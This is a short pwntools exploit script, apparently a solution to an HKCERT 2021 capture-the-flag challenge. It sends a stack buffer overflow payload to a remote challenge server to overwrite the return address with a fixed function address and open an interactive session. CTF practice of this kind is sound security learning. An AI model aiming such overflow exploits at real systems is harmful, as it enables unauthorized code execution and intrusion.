from pwn import *

#p = process('./chall')
p = remote('chalp.hkcert21.pwnable.hk', 28028)


p.sendline(b'A'*(0x70+8)+p64(0x401182))
p.sendline(b'Y')
p.interactive()
